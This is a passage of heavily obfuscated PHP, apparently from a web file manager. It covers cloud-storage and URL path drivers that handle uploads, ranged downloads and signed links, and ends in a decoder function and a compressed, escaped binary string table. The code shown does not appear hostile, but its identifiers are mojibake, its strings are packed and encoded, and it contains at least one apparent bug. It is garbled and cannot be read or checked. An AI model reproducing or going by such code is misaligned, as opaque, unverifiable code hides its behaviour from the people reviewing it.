getContent($ÕãÙ–ñÃ) { return $this->fileSubstr($ÕãÙ–ñÃ, 0, -1); } public function setContent($‚İ”¥šš, $õ§á¥¿µ = '') { $ûÚµ½ú =& $_SERVER[µÅ˜º…æ]; if (!$õ§á¥¿µ) { $‡÷Ï­£÷ = $this->ussRequest($‚İ”¥šš, $ûÚµ½ú[288]); return $‡÷Ï­£÷[$ûÚµ½ú[1403]]; } $ûáúÒÓœ = $this->tempFile($this->pathThis($‚İ”¥šš)); file_put_contents($ûáúÒÓœ, $õ§á¥¿µ); if ($this->upload($‚İ”¥šš, $ûáúÒÓœ)) { $this->tempFileRemve($ûáúÒÓœ); return !0; } return !1; } public function fileSubstr($àÆöå¼Œ, $Øœ ·ì, $òãÀß§¢) { $ƒå Çà· =& $_SERVER[µÅ˜º…æ]; if (!($İßµöŠ› = $this->link($àÆöå¼Œ))) { return !1; } $¨çÒé‡° = !1; if ($òãÀß§¢ > 0) { $Ø¨ìó‹´ = $Øœ ·ì + $òãÀß§¢ - 1; $¨çÒé‡° = array($ƒå Çà·[1605] . $Øœ ·ì . $ƒå Çà·[476] . $Ø¨ìó‹´); } $©ÏøÁõë = url_request($İßµöŠ›, $ƒå Çà·[1606], !1, $¨çÒé‡°); return $©ÏøÁõë[$ƒå Çà·[849]] ? $©ÏøÁõë[$ƒå Çà·[1393]] : !1; } public function upload($ŸôŸà¥­, $º¿Å¶Ç’, $®ª¥½ÙØ = false, $Ã£…¸Üá = REPEAT_REPLACE) { $Ì”ÙÜ‡Ğ =& $_SERVER[µÅ˜º…æ]; if (!$º¿Å¶Ç’ || !@file_exists($º¿Å¶Ç’)) { return !1; } $ÀÄ¹¸ = IO::size($º¿Å¶Ç’); if ($ÀÄ¹¸ <= 1024 * 1024 * 200) { $ùü·…ó = array($Ì”ÙÜ‡Ğ[1782] . $º¿Å¶Ç’); $ñËŒ²˜š = $this->ussRequest($ŸôŸà¥­, $Ì”ÙÜ‡Ğ[253], $ùü·…ó); return $ñËŒ²˜š[$Ì”ÙÜ‡Ğ[1403]] ? $this->getPathOuter($ŸôŸà¥­) : !1; } $–Ùå¥¹– = 1024 * 1024 * 10; $¥«˜¯ò¶ = array($Ì”ÙÜ‡Ğ[1783], $Ì”ÙÜ‡Ğ[1784] . $ÀÄ¹¸, $Ì”ÙÜ‡Ğ[1785], $Ì”ÙÜ‡Ğ[1786] . $–Ùå¥¹–); $ñËŒ²˜š = $this->ussRequest($ŸôŸà¥­, $Ì”ÙÜ‡Ğ[253], !1, $¥«˜¯ò¶); if (!$ñËŒ²˜š[$Ì”ÙÜ‡Ğ[1403]]) { return !1; } $ğïÇÏì = $ñËŒ²˜š[$Ì”ÙÜ‡Ğ[1393]]; $ºÒŒüá = 0; $ë´¶ÜÇÚ = $ğïÇÏì[$Ì”ÙÜ‡Ğ[1787]]; $Èß¼ùõ÷ = fopen($º¿Å¶Ç’, $Ì”ÙÜ‡Ğ[1667]); if (!$Èß¼ùõ÷) { return !1; } do { $ùÚûš—¬ = $ğïÇÏì[$Ì”ÙÜ‡Ğ[1788]]; fseek_64($Èß¼ùõ÷, $ºÒŒüá); $Ï©¦°Ë– = fread($Èß¼ùõ÷, $ùÚûš—¬); $Ë‚ı²æÛ = 0; do { $Ë‚ı²æÛ++; $ğïÇÏì = $this->uploadPart($ŸôŸà¥­, $ğïÇÏì, $Ï©¦°Ë–); } while (!$ğïÇÏì && $Ë‚ı²æÛ < 3); if (!$ğïÇÏì) { return !1; } $ë´¶ÜÇÚ = $ğïÇÏì[$Ì”ÙÜ‡Ğ[1787]]; $ºÒŒüá += $ùÚûš—¬; } while ($ë´¶ÜÇÚ != -1); fclose($Èß¼ùõ÷); $¥«˜¯ò¶ = array($Ì”ÙÜ‡Ğ[1789], $Ì”ÙÜ‡Ğ[1790] . $ğïÇÏì[$Ì”ÙÜ‡Ğ[1791]], $Ì”ÙÜ‡Ğ[1785]); $ñËŒ²˜š = $this->ussRequest($ŸôŸà¥­, $Ì”ÙÜ‡Ğ[253], !1, $¥«˜¯ò¶); return $ñËŒ²˜š[$Ì”ÙÜ‡Ğ[1403]] ? $this->getPathOuter($Áıõç£) : !1; } private function uploadPart($Å’Î—Ö“, $½›¨›Šå, &$‘àøñè“) { $š½òï¯Ñ =& $_SERVER[µÅ˜º…æ]; $ö´¦€Õæ = array($š½òï¯Ñ[1792], $š½òï¯Ñ[1790] . $½›¨›Šå[$š½òï¯Ñ[1791]], $š½òï¯Ñ[1793] . $½›¨›Šå[$š½òï¯Ñ[1787]], $š½òï¯Ñ[143] . $½›¨›Šå[$š½òï¯Ñ[1788]]); $íŠ÷Ê“½ = $this->ussRequest($Å’Î—Ö“, $š½òï¯Ñ[253], $‘àøñè“, $ö´¦€Õæ); return !$íŠ÷Ê“½[$š½òï¯Ñ[1403]] ? $íŠ÷Ê“½[$š½òï¯Ñ[1403]] : $íŠ÷Ê“½[$š½òï¯Ñ[1393]]; } public function uploadFormData($ÕµĞß˜ö, $ğÈ†éÙ¼ = 3600) { return $this->uploadPolicy($ÕµĞß˜ö, $ğÈ†éÙ¼); } public function uploadMultiData($Áì½‡Ùú, $ˆ¶°ı°à = 3600) { $Øƒ¡Õ‘Ä =& $_SERVER[µÅ˜º…æ]; $ıìÙûŠé = (int) $GLOBALS[$Øƒ¡Õ‘Ä[7]][$Øƒ¡Õ‘Ä[79]]; return $this->uploadPolicy($Áì½‡Ùú, $ˆ¶°ı°à, $ıìÙûŠé); } private function uploadPolicy($µ¾ØÂÈÇ, $…ìÑôÆÉ = 3600, $š•ÓŠ‘Ú = 0) { $ğ”µ…ƒ¦ =& $_SERVER[µÅ˜º…æ]; $¨ÈæÚÅš = $ğ”µ…ƒ¦[8] . $this->bucket; $·ÕÇú‹ = gmdate($ğ”µ…ƒ¦[1702]); $ãºµÔû­ = array($ğ”µ…ƒ¦[1794] => $this->bucket, $ğ”µ…ƒ¦[1795] => $µ¾ØÂÈÇ, $ğ”µ…ƒ¦[1796] => time() + $…ìÑôÆÉ, $ğ”µ…ƒ¦[1797] => $·ÕÇú‹); if ($š•ÓŠ‘Ú) { $ãºµÔû­[$ğ”µ…ƒ¦[1687]] = $š•ÓŠ‘Ú; } $Ñ‰°³·© = base64_encode(json_encode($ãºµÔû­)); $õÌÅ‰× = base64_encode(hash_hmac($ğ”µ…ƒ¦[1751], "\120\x4f\123\124\x26{$¨ÈæÚÅš}\46{$·ÕÇú‹}\x26{$Ñ‰°³·©}", md5("{$this->userpass}"), !0)); $Ü«È¸ê› = array($ğ”µ…ƒ¦[277] => $Ñ‰°³·©, $ğ”µ…ƒ¦[1798] => "\x55\120\131\x55\116\x20{$this->username}\72{$õÌÅ‰×}", $ğ”µ…ƒ¦[206] => $this->endpoint . $¨ÈæÚÅš); return $Ü«È¸ê›; } public function download($ºğñ¹Ó, $Úš€ä ˆ) { $µì¤øëü = IO::getPathInner(IO::mkfile($Úš€ä ˆ)); if (!($É•Ñ±ÓÁ = $this->link($ºğñ¹Ó))) { return !1; } $‚œĞş£À = 0; $È‹–€šÕ = 1024 * 200; $…¹­°šñ = fopen($µì¤øëü, $_SERVER[µÅ˜º…æ][1746]); while (!0) { $µãÕŸÂ˜ = $this->fileSubstr($ºğñ¹Ó, $‚œĞş£À, $È‹–€šÕ); if ($µãÕŸÂ˜ === !1) { return !1; } fwrite($…¹­°šñ, $µãÕŸÂ˜); $‚œĞş£À += $È‹–€šÕ; if (strlen($µãÕŸÂ˜) < $È‹–€šÕ) { break; } } fclose($…¹­°šñ); return $Úš€ä ˆ; } public function link($º¬Ä‚‰á, $©°Å†·¶ = array()) { $î«öÉö¯ =& $_SERVER[µÅ˜º…æ]; $º¬Ä‚‰á = trim($º¬Ä‚‰á, $î«öÉö¯[8]); if (!empty($this->token)) { $´‰ÜêÈ = strtotime(date($î«öÉö¯[1799])); $¥ËÖßå™ = substr(md5($this->token . $î«öÉö¯[284] . $´‰ÜêÈ . $î«öÉö¯[1800] . $º¬Ä‚‰á), 12, 8) . $´‰ÜêÈ; $©°Å†·¶[] = $î«öÉö¯[1801] . $¥ËÖßå™; } $é—ˆìÔ = !empty($©°Å†·¶) ? $î«öÉö¯[76] . implode($î«öÉö¯[284], $©°Å†·¶) : $î«öÉö¯[12]; return $this->getHost() . $î«öÉö¯[8] . $this->pathEncode($º¬Ä‚‰á) . $é—ˆìÔ; } public function fileOut($ú¾Î´·õ, $Ğ‘­×… = false, $˜Øˆğ­ = false, $®—¸Ù‚¥ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ú¾Î´·õ, $Ğ‘­×…, $˜Øˆğ­, $®—¸Ù‚¥); } if (!$˜Øˆğ­) { $˜Øˆğ­ = $this->pathThis($ú¾Î´·õ); } $ª¸–´ú = $Ğ‘­×… ? array($_SERVER[µÅ˜º…æ][1802] . rawurlencode($˜Øˆğ­)) : array(); $ÒúÇ¾Ôõ = $this->link($ú¾Î´·õ, $ª¸–´ú); $this->fileOutLink($ÒúÇ¾Ôõ); } public function fileOutServer($Ö»Í¯Ş©, $¶äÉïİÍ = false, $—ï¡›î— = false, $«ìóªÒÉ = '') { parent::fileOut($Ö»Í¯Ş©, $¶äÉïİÍ, $—ï¡›î—, $«ìóªÒÉ); } public function fileOutImage($¼ì†Æüî, $¤òİÉÉï = 250) { $³ı´¸ñó = $this->link($¼ì†Æüî . $_SERVER[µÅ˜º…æ][1803] . $¤òİÉÉï); $this->fileOutLink($³ı´¸ñó); } public function fileOutImageServer($ˆŸš‘å, $©Ñ·—¨Á = 250) { parent::fileOutImage($ˆŸš‘å, $©Ñ·—¨Á); } public function hashMd5($Õî¹§) { $øÆ¯”­ =& $_SERVER[µÅ˜º…æ]; $œ¾±©È = $this->_objectMeta($Õî¹§); return isset($œ¾±©È[$øÆ¯”­[245]]) ? $œ¾±©È[$øÆ¯”­[245]] : !1; } public function size($·˜Û©ßî) { $¼ó¿êïƒ = $this->objectMeta($·˜Û©ßî); return $¼ó¿êïƒ ? $¼ó¿êïƒ[$_SERVER[µÅ˜º…æ][79]] : 0; } public function info($Ú“ã©ËÊ) { if ($this->isFolder($Ú“ã©ËÊ)) { return $this->folderInfo($Ú“ã©ËÊ); } else { if ($this->isFile($Ú“ã©ËÊ)) { return $this->fileInfo($Ú“ã©ËÊ); } } return !1; } public function exist($Ì‹×æš‰) { return $this->isFile($Ì‹×æš‰) || $this->isFolder($Ì‹×æš‰); } public function isFile($ª£†¯Œè) { return !$this->isFolder($ª£†¯Œè) && $this->objectMeta($ª£†¯Œè); } public function isFolder($‘¦Îàè) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][177], $‘¦Îàè); } protected function objectMeta($„İèˆÅ‰) { return $this->cacheMethod($_SERVER[µÅ˜º…æ][179], $„İèˆÅ‰); } protected function _objectMeta($É´¯¯Ä) { $º«—ßÅŞ =& $_SERVER[µÅ˜º…æ]; if ($É´¯¯Ä == $º«—ßÅŞ[12] || $É´¯¯Ä == $º«—ßÅŞ[8]) { return array(); } $®½¼“×Ô = $this->ussRequest($É´¯¯Ä, $º«—ßÅŞ[1804]); if (!$®½¼“×Ô[$º«—ßÅŞ[1403]]) { return null; } $¿öØ×³¾ = isset($®½¼“×Ô[$º«—ßÅŞ[1393]]) ? $®½¼“×Ô[$º«—ßÅŞ[1393]] : array(); if (!isset($¿öØ×³¾[$º«—ßÅŞ[1805]])) { return null; } $•öˆ™ÄÔ = array($º«—ßÅŞ[33] => isset($¿öØ×³¾[$º«—ßÅŞ[1805]]) ? $¿öØ×³¾[$º«—ßÅŞ[1805]] : null, $º«—ßÅŞ[79] => isset($¿öØ×³¾[$º«—ßÅŞ[1806]]) ? $¿öØ×³¾[$º«—ßÅŞ[1806]] : null, $º«—ßÅŞ[245] => isset($¿öØ×³¾[$º«—ßÅŞ[1807]]) ? $¿öØ×³¾[$º«—ßÅŞ[1807]] : null, $º«—ßÅŞ[1774] => isset($¿öØ×³¾[$º«—ßÅŞ[1808]]) ? $¿öØ×³¾[$º«—ßÅŞ[1808]] : null); $•öˆ™ÄÔ[$º«—ßÅŞ[1775]] = isset($¿öØ×³¾[$º«—ßÅŞ[1809]]) ? strtotime($¿öØ×³¾[$º«—ßÅŞ[1809]]) : $•öˆ™ÄÔ[$º«—ßÅŞ[1774]]; return $•öˆ™ÄÔ; } protected function _isFolder($â£“¶¼§) { $ˆ¿ÅãË =& $_SERVER[µÅ˜º…æ]; if ($â£“¶¼§ == $ˆ¿ÅãË[12] || $â£“¶¼§ == $ˆ¿ÅãË[8]) { return !0; } $ë¤·êÑÚ = $this->_objectMeta($â£“¶¼§); return isset($ë¤·êÑÚ[$ˆ¿ÅãË[33]]) && $ë¤·êÑÚ[$ˆ¿ÅãË[33]] == $ˆ¿ÅãË[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ŒäÈ‡ä = false) { } public function exist($È›È—Ú) { $Éõ×”ÇÔ = $this->info($È›È—Ú); return $Éõ×”ÇÔ[$_SERVER[µÅ˜º…æ][232]]; } public function isFile($ı·°äˆÕ) { $Ôôéå™Î = $this->info($ı·°äˆÕ); return $Ôôéå™Î[$_SERVER[µÅ˜º…æ][232]]; } public function isFolder($ €ó¥¤÷) { return !1; } public function size($Î´Àæøí) { $À»å‰Ú¯ = $this->info($Î´Àæøí); return $À»å‰Ú¯[$_SERVER[µÅ˜º…æ][79]]; } public function info($ÈÜ®›ä) { return $this->infoParse($ÈÜ®›ä); } public function infoAuth($îÏæ£Ğ¢) { return $this->infoParse($îÏæ£Ğ¢); } public function infoWithChildren($ÒæÒ¤Æ) { return $this->infoParse($ÒæÒ¤Æ); } public function infoFull($…®ñ¦óÄ) { return $this->infoParse($…®ñ¦óÄ); } private function infoParse($¬›Í—»¤) { $Ë­‡«Ë” =& $_SERVER[µÅ˜º…æ]; $ºº¡´åˆ = $this->header($¬›Í—»¤); if (!$ºº¡´åˆ || !$ºº¡´åˆ[$Ë­‡«Ë”[849]]) { return !1; } $¡¬ŒÜïæ = _get($ºº¡´åˆ, $Ë­‡«Ë”[412], 0); $ÍİòÎÙü = array($Ë­‡«Ë”[32] => $ºº¡´åˆ[$Ë­‡«Ë”[32]], $Ë­‡«Ë”[87] => $¬›Í—»¤, $Ë­‡«Ë”[33] => $Ë­‡«Ë”[230], $Ë­‡«Ë”[79] => intval($¡¬ŒÜïæ), $Ë­‡«Ë”[166] => get_path_ext($ºº¡´åˆ[$Ë­‡«Ë”[32]]), $Ë­‡«Ë”[1664] => $¡¬ŒÜïæ > 0 && $ºº¡´åˆ[$Ë­‡«Ë”[1810]], $Ë­‡«Ë”[1665] => !1); return $ÍİòÎÙü; } private function header($ƒÛ†òÖ) { $­ª§Š³è =& $_SERVER[µÅ˜º…æ]; if (isset(self::$_cacheHeader[$ƒÛ†òÖ])) { return self::$_cacheHeader[$ƒÛ†òÖ]; } $Æšı¸åå = isset($GLOBALS[$­ª§Š³è[1811]]) ? $GLOBALS[$­ª§Š³è[1811]] : !1; $GLOBALS[$­ª§Š³è[1811]] = !0; self::$_cacheHeader[$ƒÛ†òÖ] = url_header($ƒÛ†òÖ); $GLOBALS[$­ª§Š³è[1811]] = $Æšı¸åå; return self::$_cacheHeader[$ƒÛ†òÖ]; } public function hashSimple($ùïˆà«, $ãá©†×· = false) { $Œäõ›è¬ =& $_SERVER[µÅ˜º…æ]; $˜¤±áüâ = $this->info($ùïˆà«); if (!$˜¤±áüâ || !$˜¤±áüâ[$Œäõ›è¬[232]]) { return !1; } $İ÷§¸ıí = $˜¤±áüâ[$Œäõ›è¬[79]]; $üÒÚîÎ“ = 200; $ˆš´‚º» = 50; if ($İ÷§¸ıí <= $üÒÚîÎ“ * $ˆš´‚º») { return md5($this->fileSubstr($ùïˆà«, 0, $İ÷§¸ıí)) . $İ÷§¸ıí; } $îÒ½ƒ = intval($İ÷§¸ıí / $ˆš´‚º»); $Ï‰ó¦È° = $Œäõ›è¬[12]; $£”‚¤ã¾ = timeFloat(); $õøÏ‚Ã = 15; for ($ÛãàÎ† = 0; $ÛãàÎ† < $ˆš´‚º»; $ÛãàÎ†++) { if (timeFloat() - $£”‚¤ã¾ > $õøÏ‚Ã) { return !1; } $Ÿ…—…®¸ = $this->fileSubstr($ùïˆà«, $îÒ½ƒ * $ÛãàÎ†, $üÒÚîÎ“); if (!$Ÿ…—…®¸) { return !1; } $Ï‰ó¦È° .= $Ÿ…—…®¸; } $Ï‰ó¦È° .= $this->fileSubstr($ùïˆà«, $İ÷§¸ıí - $üÒÚîÎ“, $üÒÚîÎ“); return md5($Ï‰ó¦È°) . $İ÷§¸ıí; } public function getContent($‹Ì›çˆ) { return $this->fileSubstr($‹Ì›çˆ); } public function fileSubstr($É›‚´‚†, $·ˆëÍÅá = 0, $ıÒô¥Â = -1) { $°İîğ =& $_SERVER[µÅ˜º…æ]; $‰ÛËÄ¥ = $this->info($É›‚´‚†); if (!$‰ÛËÄ¥ || !$‰ÛËÄ¥[$°İîğ[232]] && $‰ÛËÄ¥[$°İîğ[79]] > 1024 * 1024 * 10) { return !1; } if ($ıÒô¥Â === -1) { $ıÒô¥Â = $‰ÛËÄ¥[$°İîğ[79]]; } if ($ıÒô¥Â == 0) { return $°İîğ[12]; } $´ê’ÇÀñ = array($°İîğ[1812] . $·ˆëÍÅá . $°İîğ[887] . ($·ˆëÍÅá + $ıÒô¥Â - 1)); $Íì‹¥Àå = url_request($É›‚´‚†, $°İîğ[1606], !1, $´ê’ÇÀñ, !1, !1, 30); return $Íì‹¥Àå[$°İîğ[1393]] ? $Íì‹¥Àå[$°İîğ[1393]] : $°İîğ[12]; } public function download($æºµ‚¯‚, $«€á±ÏÊ) { Downloader::start($æºµ‚¯‚, $«€á±ÏÊ); return $«€á±ÏÊ; } } goto Cˆå´ÇÇÊ¤; d„ÓÎâÉ’Ó: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xb5\xc5\x98\xba\x85\xe6", strrev('íşºĞé')); $_SERVER[µÅ˜º…æ] = explode("\x7c\x2\x7c\x5\x7c\x1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x79\x7c\x5c\x65\xd5\x38\x2e\x22\xb2\x28\x8b\x80\xa8\xaf\x2\xb7\xb5\x25\x49\x3b\x4b\x92\x6e\x34\x6d\xda\x4e\x92\x49\x32\x74\x92\x9\x33\x93\x2e\x34\xf5\xf6\x66\xe6\x66\xe6\x36".strrev('·Çûçßßg{yç9g¿ˆ¾"HT@Q@Aq6R+À¡@@AE‚… ìÊidïs§s3')."\237\266\163\237\175\73\317\171\316\71\317\71\347\171\176\327\157\176\364\310\253\133\77\276\165\237\255\173\375\161\347\233\327\175\343\51\376\275\365\23\133\367\46\277\354\373\350\163\366\373\30\373\163\330\71\147"."\67\66\366\56\74\140\156\377\247\57\270\355\46\343\6\143\247\161\136\42\376\310\257\142\7\76\166\343\161\321\335\127\77\62\271\173\257\217\255\70\173\171\246\215\144\346\145\333\370\217\126\262\135\315\234\260"."\x1c\xd7\xe1\x11\x19\xbb\x34\x62\xe5\xf8\xb7\x55\xe2\xbf\x61\xfe\x33\x98\x8c\x57\xcc\xa2\xed\x9a\x3c\x18\xe2\x3f\x3a\xf4\x8b\xfd\xef\x6c\x2a\x58\x98\xae\xf7\x27\xd2\x7a\x6a\x70\x60\x20\x9a\x4c\x43\xa6\x36\x35\xbd\x68\x67\xe1"."\253\154\124\214\42\264\137\66\53\16\351\215\132\235\136\266\313\146\311\23\43\43\262\206\153\14\33\16\324\324\325\241\167\105\7\342\211\265\172\172\355\100\24\162\14\353\233\252\146\145\222\207\330\147\312\65"._kodDe('Ll4aGsoSimi35DUTmwPKx9u5wm84whp+ieoVZGmSVx+fnoY/fdIWfuHXOMq6cYSUVB+XgZIF7s08')."\52\215\330\215\332\6\236\262\101\153\342\37\335\226\131\310\362\317\222\201\335\161\47\313\360\225\26\137\144\231\112\325\102\201\7\372\305\127\326\34\61\252\5\230\255\56\65\120\256\130\105\3\7\275\322\234"."\x14\xb1\xfc\xc3\xa8\xba\xb6\x55\xca\xf0\x40\x74\xc2\xad\x18\x32\x9e\xf4\x35\x43\x16\xda\x2c\x41\x55\xa9\x68\x3c\xda\x99\xd6\x68\x7\xb5\xee\x64\xa2\x4f\x83\x45\x28\x1a\x8e\x6b\x56\xb4\xd5\xbd\xd1\x64\x54\xa3\x9d\x6e\x6f\x60"."\143\155\320\0\136\372\311\124\150\221\170\134\233\256\6\327\54\226\261\32\136\246\116\145\211\144\127\64\251\165\254\325\344\14\145\354\142\321\56\205\110\55\144\45\135\245\253\321\144\222\177\4\0\274\343\61"."\xba\x68\x10\x48\x74\x77\xa7\xa2\x22\x4\x83\x3b\x3e\x4e\x7a\x32\xf\xe0\xd3\x13\xca\x8e\x14\x5c\x7d\xcc\x28\x54\x11\x4c\x47\xf9\x6f\x3\xfc\xc0\xaf\xed\x0\xe8\x6e\xb2\x4a\x56\x15\xc0\x14\xaa\xb0\x6d\xb1\xad\xe0\xa3\x8a\xb9"."\115\214\61\263\360\121\44\345\155\50\67\14\161\303\230\153\43\176\130\144\207\216\361\317\366\145\374\167\11\224\37\326\151\232\131\161\165\263\224\261\263\126\11\366\361\162\200\107\303\315\167\125\54\222\201\207"."\107\354\102\26\277\35\153\63\214\162\304\52\230\375\325\242\232\105\4\63\171\253\220\255\340\326\373\260\234\74\30\27\73\231\346\225\241\62\351\211\100\2\326\310\244\334\212\64\337\200\110\165\354\152\45\143"."\306\310\326\341\341\26\210\66\135\227\14\16\47\304\36\54\27\154\43\233\62\53\142\150\226\335\115\52\112\124\135\65\162\24\167\101\126\231\204\41\250\62\157\26\12\272\71\141\302\226\50\146\27\70\70\226"."\xb0\x33\x6c\x95\xc2\x24\x86\x7\x63\x9\x3d\x6f\x38\xf9\xbe\xec\x2\x9d\x95\x42\x5c\x99\x35\x27\x42\xe5\x7c\x19\xf6\xab\xd8\xa2\x43\x1e\x90\xa5\x23\xef\xb7\xdd\xa8\x82\x71\xb\x76\xc6\x80\xbc\x55\x36\x10\xfe\x9d\x77\xdd\x72"."\312\54\145\351\100\240\333\366\170\211\15\264\154\232\220\251\53\240\145\265\76\155\255\326\333\146\265\71\130\260\130\20\137\70\72\21\347\210\110\167\2\127\43\73\2\300\206\10\177\46\64\150\71\14\167\311"."\215\147\224\313\5\53\143\270\226\135\12\333\31\327\164\203\216\133\61\15\250\61\222\311\230\216\23\354\264\113\156\305\56\4\43\205\202\75\36\114\124\254\234\125\152\323\346\0\32\45\211\144\273\6\51\152"."\x6b\x83\x3d\x38\x73\x89\x46\xd7\x9d\x36\x33\xa7\xbd\xea\x8e\x4\x8f\xc5\xbd\x25\x72\x57\x8c\x92\x33\x62\x56\x82\x51\x0\xec\x36\x8d\x74\x56\xe0\x37\xcc\xd6\x65\x39\x65\xdb\xb1\x68\xf7\xda\x34\xc3\x75\x8d\x4c\x9e\xe2\x6\x59"."\x7d\xfb\x87\xe4\xb7\x4a\x5\xab\x64\xd6\xe6\x25\x95\x98\xc1\x81\x8a\x91\x2b\x1a\x6d\x5a\xb9\x3a\x4c\x26\x0\xf6\x13\xc4\x65\x68\xe\x35\x33\x4c\x40\x9b\x56\x34\x26\x82\x46\xe\x6b\x8a\x4e\x94\xad\x8a\xe9\xe0\xa8\xb5\x9e\xbe"."\64\100\324\110\260\217\356\3\313\314\6\123\4\371\102\145\363\232\347\153\4\126\64\114\343\261\275\351\364\200\36\353\46\247\153\177\124\357\213\244\73\173\241\166\327\310\141\325\161\202\122\105\225\30\271\46"."\110\366\3\205\246\176\62\70\31\71\140\217\233\25\322\160\307\144\233\66\152\147\207\355\211\20\46\321\314\51\202\30\60\63\135\337\262\33\114\32\245\34\35\306\360\244\153\72\176\324\322\101\316\342\320\10"."\xdf\x7c\xa1\x61\x73\xc4\xae\xc0\x68\x9c\xb1\x9c\x77\xf2\xe3\x66\x29\xe7\xe6\xb1\xee\x54\x34\xb9\x2a\x9a\xd4\x53\x89\xee\xf4\xea\x48\x12\x8e\xee\x12\x81\x9c\x9\xec\xd\x6d\xbd\x10\x4c\x9a\x59\x32\x89\x19\x17\xcb\x19\x65\x39".strrev('ù ¦Üì¡ÆœÎCíÌlÂ‡@÷®rl›'."\n".'EsÃ¢ÑVãºÂæ¨)’uÜèzÇ‹L"n•1ÆĞÃt‚kû')."\x4e\xd3\xba\xa1\xae\xd0\x9c\xf5\xcb\xc3\x96\x2c\x13\x6e\x9\xb5\x68\xad\xcd\xb\xb5\x1\x42\x68\x58\x46\x41\x83\x41\xd7\xe4\x68\xd6\x12\x2b\xbd\xd3\x22\x21\xbc\x64\x97\xcc\xba\x1b\x8b\x0\x92\xed\x98\xc1\x5e\xd3\x20\x38\x96"."\x2c\x84\x67\x5d\x2\xd8\x16\xf\x7f\xc8\xec\xd2\xa3\x4e\xc1\x25\xbe\x75\xe1\x91\xc9\xe8\xf1\x83\xd1\x54\x5a\xef\x8b\xa6\x7b\x13\x5d\xd0\xfd\x68\x4\xbe\x4a\xa4\x30\xeb\x2f\xae\x31\xa5\xab\xe0\x54\x2b\x41\xb5\xe6\x84\x72\x4".base64_decode('SFSeUSeEleu3xxF5+wCoM29mRqdJI18wGpvjJVy6dfxnPUDzev6j653xaCSpA0GqW063cgrSoEA=')."\267\272\75\274\221\0\132\237\351\32\162\0\244\271\130\221\154\151\71\20\335\173\144\341\50\373\44\340\223\35\264\332\312\212\63\215\4\173\115\53\227\207\176\133\264\272\214\135\260\53\106\201\36\5\110\206".base64_decode('5izAyuVClWyDMK04na8Wh4EaJ1OWM11JITqThIwq4vlKDmk31uU5RSEU1inoDoXKpVzTLKhLb10=')."\320\114\43\140\125\141\144\204\124\256\232\265\103\17\145\154\262\317\373\214\121\263\215\216\5\220\333\22\26\213\1\5\177\56\241\107\136\273\37\115\320\325\52\204\212\244\22\126\147\247\55\16\144\316\214\54"."\xf1\x1e\x79\x9a\x59\xa9\xd8\x95\x19\x90\x83\x7d\x6b\xec\xdc\xa4\xcb\x5\x95\xbb\x82\x88\x70\x8\x46\xc0\xef\xbc\x2d\x88\xe\x1b\x61\xb3\x2d\xc\xe3\x9e\xdd\xda\xd\x58\x24\x4b\x88\xaf\x90\xe3\x92\x45\x20\x3\x34\xb2\xd9\x7a"."\xd1\x4\xf3\x40\x5\x5b\x11\x6c\x59\x2\x92\x5\xe1\xd4\x3c\xf2\x57\xd2\x0\x59\xbb\x68\xe0\x89\x4a\x11\x91\x68\x96\x6\x1c\x11\x62\xc7\xa4\x99\xe5\xe7\xa4\x27\x8a\x6f\x70\x1e\x35\x7\x9b\xac\xb8\x36\x4d\xac\x78\x72\x12\x20".base64_decode('zdvQaQIVMOCqGDnOQdYsmAhgeRNJjWbIRlZGgN+I2AeEFyCxkkSznCQpSQkDDK+mzJOMoNQRwJU=')."\374\54\220\125\115\260\15\45\303\3\25\163\304\232\100\124\62\341\366\31\225\121\34\30\51\51\267\42\15\50\333\264\173\60\36\327\73\23\375\151\302\173\361\230\325\311\130\72\212\30\53\322\245\107\72\7"."\x20\x24\x71\xa0\x20\xe0\x54\x12\x84\xc7\x8c\xb5\x2\x8\x91\x4e\x84\x25\xad\x44\xe\xeb\xb2\x5d\x22\x98\x16\x90\x55\x50\x72\x66\x35\x49\x59\x49\x4a\x0\xec\x48\xf2\xc3\x47\x51\x10\x9a\xa0\xb8\x39\x58\x24\x78\x25\x28\xfa\x34"."\60\10\264\0\102\5\122\265\35\223\335\166\5\311\70\53\127\132\45\126\176\165\152\176\260\267\57\322\31\114\365\106\132\27\54\344\261\153\213\331\241\164\257\345\14\235\40\302\320\235\161\147\276\136\61\311"."\236\106\130\150\155\156\301\35\107\350\22\103\366\174\155\260\30\244\265\120\222\62\324\334\334\214\165\315\135\250\345\11\52\21\370\73\313\106\213\214\112\65\63\152\252\350\334\11\216\133\210\363\146\11\322\173".base64_decode('Vu3kO1V2uulGhlank8Ju1VFnigBglhSxkErmsUYhZxO4yxfVyKyAXx42OckFDeUNMU909nBzEII=')."\x6e\x52\x2d\x44\xa7\x99\xf4\x1\xf1\xb7\x97\xc6\xd6\xd2\xf5\x27\x9a\x93\xee\x31\x98\x6d\xd9\x8f\x32\x3d\xd9\x8\xd6\xc6\x65\x3b\x86\xff\x1c\x0\xdd\xa8\x92\x7d\x5b\xb1\x36\x2b\xb3\xbf\x1c\x6b\x42\x9c\x99\x48\x41\x93\x13\xc5"."\x82\x64\xa1\x60\x6a\x60\x36\xd5\xa1\x4d\xe8\x24\x45\x87\x14\x5d\x4d\xe9\x15\x78\x0\x57\xa1\xaf\xcb\xb7\x27\xf8\xe1\xcf\xe3\x96\x2e\x27\x2d\x6a\x63\x54\x20\x63\x97\xda\x1b\x5a\x42\xcd\xd\x1a\x32\x96\xed\xd\x83\xe9\x6e\x42".strrev('»¤>lÂP¡…jéá¥¾jÃK:œÓDtß„'."\r".')KŒ`Ë¹^:-pZ¯¥h¦X»NÒÀv_/§')."\xc9\x3e\x80\xf1\x72\x59\x82\x55\x39\x53\x6f\xb7\x5\x25\x46\xaa\x3a\x41\x93\xd2\xc9\xb0\xb\x8c\x4c\xc1\x7\xa2\xea\x5c\xac\xa9\xb\x89\x6b\xea\x41\xe2\x1a\x1f\x24\xae\xa9\x85\xc4\x35\xf5\xe0\x6c\xc\x0\xd2\x28\x1a\x9b\xed"."\22\331\257\344\240\55\206\62\0\26\351\336\130\377\112\275\57\